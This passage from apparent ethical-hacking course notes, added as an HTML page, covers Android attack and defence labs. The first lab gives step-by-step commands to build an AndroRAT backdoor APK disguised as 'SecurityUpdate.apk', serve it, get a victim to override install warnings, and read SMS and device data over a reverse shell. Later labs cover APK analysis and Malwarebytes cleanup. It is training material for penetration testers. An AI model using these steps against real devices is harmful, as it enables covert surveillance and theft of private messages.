+                    <span class="tool-tag">AndroRAT / Python / Apache2 / Android Emulator / Parrot Security</span>
+                    <p><strong>What/when:</strong> Build a malicious APK (SecurityUpdate.apk) with AndroRAT pointing at attacker IP 10.10.1.13 port 4444, host it via Apache, and start the AndroRAT listener. Victim installs and runs it; attacker gets an interpreter shell to query device info, SMS, MAC address, etc. Demonstrates persistent Android RAT. Attacker IP 10.10.1.13; victim IP 10.10.1.14.</p>
+                    <pre><code># Parrot Security machine
+# Open terminal (MATE Terminal icon)
+sudo su
+# [sudo] password for attacker: toor (not visible)
+
+# Navigate to AndroRAT and build APK
+cd AndroRAT
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+# --build: build the APK
+# -i: local IP address (10.10.1.13)
+# -p: port number (4444)
+# -o: output APK file (SecurityUpdate.apk)
+# APK generated at /home/attacker/AndroRAT/SecurityUpdate.apk
+
+# Copy APK to web share (create share if missing)
+cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
+# if share missing:
+# mkdir /var/www/html/share
+# chmod -R 755 /var/www/html/share
+# chown -R www-data:www-data /var/www/html/share
+
+# Start Apache
+service apache2 start
+
+# Start AndroRAT listener
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+# --shell: get interpreter
+# -i: listen IP (0.0.0.0)
+# -p: port (4444)
+# waits for connection
+
+# Victim: Android emulator
+# if non-responsive: Commands -&gt; Power -&gt; Reset/Reboot (Yes)
+# open Chrome; address bar: http://10.10.1.13/share
+# click SecurityUpdate.apk to download
+# (Allow storage; File might be harmful -&gt; Download anyway)
+# File downloaded -&gt; Open
+# Google Service Framework -&gt; INSTALL
+# App installed -&gt; OPEN
+# (Play Protect: INSTALL ANYWAY; scanning: DON'T SEND)
+# app runs in background
+
+# Attacker: Parrot Security (connection from 10.10.1.14)
+# Interpreter session opened
+help
+deviceInfo
+getSMS inbox
+# SMS file stored at /home/attacker/AndroRAT/Dumps
+getMACAddress
+# run other help commands as needed
+exit
+# terminate interpreter session</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Parrot Security; open MATE Terminal; sudo su; toor. cd AndroRAT; build SecurityUpdate.apk with androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk. Copy APK to /var/www/html/share (create share if missing); start Apache. Start listener with androRAT.py --shell -i 0.0.0.0 -p 4444. Switch to Android; reboot if needed; open Chrome; browse http://10.10.1.13/share; download and install SecurityUpdate.apk (allow unknown sources, install anyway). App runs in background. Switch to Parrot; interpreter session from 10.10.1.14 opens. Run help, deviceInfo, getSMS inbox, getMACAddress; exit. Close windows; document findings. Note other Android hacking tools: NetCut, drozer, zANTI, Network Spoofer, DroidSheep.</p>
+                    <p><strong>Notes:</strong> AndroRAT provides a fully persistent backdoor starting on device boot and collects location, SIM, IP, and MAC. Versions/website appearance may differ; process same. Always obtain proper authorization.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 2: Secure Android Devices using Various Android Security Tools - Overview</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Lab Scenario, Objectives, and Overview</span>
+                    <p><strong>Lab Scenario:</strong> Like personal computers, mobile devices store sensitive data and are susceptible to various threats. Therefore, they should be properly secured in order to prevent the compromise or loss of confidential data, lessen the risk of various threats such as viruses and Trojans, and mitigate other forms of abuse. Strict measures and security tools are vital to strengthening the security of these devices. Android's growing popularity has led to increased security threats, ranging from typical malware to advanced phishing and identity theft techniques. As a professional ethical hacker or penetration tester, you should scan for any unsecured settings on the mobile device you are assessing, and then take appropriate action to secure them. You must do this before hackers exploit these vulnerabilities by; for example, downloading sensitive data, committing a crime using your Android device as a launchpad, and ultimately endangering your business.</p>
+                    <p><strong>Lab Objectives:</strong> Analyze a malicious app using online Android analyzers; secure Android devices from malicious apps using Malwarebytes Security.</p>
+                    <p><strong>Overview of Android Security Tools:</strong> Android security tools reveal the security posture of particular Android platforms and devices. You can use them to find various ways to strengthen the security and robustness of your organization's mobile platforms. These tools automate the process of accurate Android platform security assessment.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 2: Secure Android Devices using Various Android Security Tools - Task 1: Analyze a Malicious App using Online Android Analyzers</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Sixo Online APK Analyzer / sisik.eu / Backdoor.apk / Android Emulator / Chrome</span>
+                    <p><strong>What/when:</strong> Upload the malicious Backdoor.apk (from Lab 1 Task 1) to Sixo Online APK Analyzer (https://www.sisik.eu/apk-tool) and inspect requested permissions, AndroidManifest.xml, APK signature, and source code. Used for static analysis of malicious apps. Re-create Backdoor.apk if missing.</p>
+                    <pre><code># Android machine
+# if Backdoor.apk missing: follow Lab 1 Task 1 to re-create it
+# if non-responsive: reboot via Commands -&gt; Power -&gt; Reset/Reboot (Yes)
+
+# Open Chrome on Android Home screen
+# address bar: https://www.sisik.eu/apk-tool  (press Enter)
+# (cookie pop-up: Got it!)
+# click "Drop APK here or click to select file"
+# Choose an action pop-up -&gt; Files  (allow Chrome storage if prompted)
+# Downloads screen -&gt; double-click Backdoor.apk
+# (if in Recent folder, use ellipse icon top-left -&gt; Downloads)
+
+# Analyze results
+# scroll to Requested Permissions section (declared in AndroidManifest.xml)
+# scroll to AndroidManifest.xml section (package name, version, components, permissions)
+# scroll to APK Signature and App Source Code sections</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Android; reboot if non-responsive. Open Chrome; navigate to https://www.sisik.eu/apk-tool. Upload Backdoor.apk from Downloads. Inspect Requested Permissions, AndroidManifest.xml, APK Signature, and App Source Code. Note other online analyzers: SandDroid (sanddroid.xjtu.edu.cn), Apktool (javadecompilers.com). Note other vulnerability scanners: X-Ray 2.0 (duo.com), Vulners Scanner, Shellshock Scanner - Zimperium, Yaazhini (vegabird.com), QARK (github.com). Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> Online analyzers decompile binary XML and resources. Permissions are declared in AndroidManifest.xml. Versions/website appearance may differ; process same. Always obtain proper authorization.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 2: Secure Android Devices using Various Android Security Tools - Task 2: Secure Android Devices from Malicious Apps using Malwarebytes Security</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Malwarebytes Security / Android Emulator</span>
+                    <p><strong>What/when:</strong> Run Malwarebytes Security on Android: reboot, open app, get started, grant permissions, skip subscription, SCAN NOW, remove detected threats, and review scan history. Used to secure Android devices from malicious apps. Other AV/anti-spyware: AntiSpy Mobile, Spyware Detector, iAmNotified, Privacy Scanner.</p>
+                    <pre><code># Android machine
+# reboot: Commands -&gt; Power -&gt; Reset/Reboot machine (Yes)
+# after reboot: Home screen swipe up -&gt; click Malwarebytes app
+
+# Malwarebytes Security
+# "Let's get you started" -&gt; Get started
+# permissions -&gt; Give permission -&gt; system pop-up -&gt; ALLOW
+# "Already have a subscription" -&gt; skip
+# "Your device has issues!" -&gt; SCAN NOW (under LAST DEVICE SCAN)
+# scan runs
+# Threats screen -&gt; Remove selected
+# confirmation pop-up -&gt; OK
+# "All items have been dealt with!"
+# (Share the love pop-up -&gt; NOT NOW)
+# On-demand scan (under Previous scans) -&gt; view Scanning history (deleted malicious file)</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Android; reboot. After reboot swipe up; open Malwarebytes. Get started; grant permissions; skip subscription. Click SCAN NOW; wait for scan. On Threats screen click Remove selected; confirm OK. View "All items have been dealt with!"; dismiss Share the love. Click On-demand scan to view scan history and deleted malicious file. Close windows; document findings. Note other mobile AV/anti-spyware: AntiSpy Mobile, Spyware Detector - Spy Scanner, iAmNotified - Anti Spy System, Privacy Scanner (AntiSpy) Free.</p>
+                    <p><strong>Notes:</strong> Malwarebytes blocks, detects, and removes adware/malware; conducts privacy audits; ensures safer browsing. Versions/website appearance may differ; process same. Always obtain proper authorization.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Practice &amp; Reference</h3>
+                <div class="section-card">
+                    <p>The lab tasks above provide hands-on practice and reference commands for hacking mobile platforms: Android backdoor APK creation and Meterpreter sessions (msfvenom/Metasploit), credential harvesting with SET, mobile-based DoS with LOIC, ADB exploitation with PhoneSploit (shell, screenshot, apps, MAC/Inet, netstat), persistent RAT deployment with AndroRAT (device info, SMS, MAC), static APK analysis with Sixo (permissions, AndroidManifest, signature), and Android hardening with Malwarebytes (scan/remove/history).</p>
+                </div>
+            </section>
+        </div>
+    </main>
+    <script>
+        const body = document.body;
+        const applyTheme = (t) => {
+            if (t === 'dark') body.setAttribute('data-theme', 'dark');
+            else body.removeAttribute('data-theme');
+        };
+        function getTheme() {
+            try {
+                const p = new URLSearchParams(location.search);
+                const u = p.get('theme');
+                if (u === 'dark' || u === 'light') return u;
+            } catch (e) {}
+            try { return localStorage.getItem('theme') || 'light'; } catch (e) { return 'light'; }
+        }
+        function syncNavLinks(t) {
+            document.querySelectorAll('a[href]').forEach(a => {
+                try {
+                    const url = new URL(a.getAttribute('href'), location.href);
+                    if (url.pathname.endsWith('.html')) {
+                        url.searchParams.set('theme', t);
+                        a.setAttribute('href', url.pathname.split('/').pop() + '?' + url.searchParams.toString());
+                    }
+                } catch (e) {}
+            });
+        }
+        const initialTheme = getTheme();
+        applyTheme(initialTheme);
+        syncNavLinks(initialTheme);
+        const toggle = document.getElementById('themeToggle');
+        if (toggle) {
+            toggle.addEventListener('click', () => {
+                const newT = body.hasAttribute('data-theme') ? 'light' : 'dark';
+                applyTheme(newT);
+                try { localStorage.setItem('theme', newT); } catch (e) {}
+                try {
+                    const url = new URL(location.href);
+                    url.searchParams.set('theme', newT);
+                    history.replaceState(null, '', url.toString());
+                } catch (e) {}
+                syncNavLinks(newT);
+            });
+        }
+        const path = window.location.pathname.split('/').pop();
+        const navMap = {
+            'index.html': 'nav-index',
+            'module_02.html': 'nav-02',
+            'module_03.html': 'nav-03',
+            'module_04.html': 'nav-04',
+            'module_05.html': 'nav-05',
+            'module_06.html': 'nav-06',
+            'module_07.html': 'nav-07',
+            'module_08.html': 'nav-08',
+            'module_09.html': 'nav-09',
+            'module_10.html': 'nav-10',
+            'module_11.html': 'nav-11',
+            'module_12.html': 'nav-12',
+            'module_13.html': 'nav-13',
+            'module_14.html': 'nav-14',
+            'module_15.html': 'nav-15',
+            'module_16.html': 'nav-16',
+            'module_17.html': 'nav-17',
+            'module_18.html': 'nav-18',
+            'module_19.html': 'nav-19',
+            'module_20.html': 'nav-20',
+            'cheat_sheet.html': 'nav-cheat'
+        };
+        const navId = navMap[path] || 'nav-index';
+        document.getElementById(navId).classList.add('active');
+    </script>
+    <script src="app.js"></script>
+</body>
+</html>
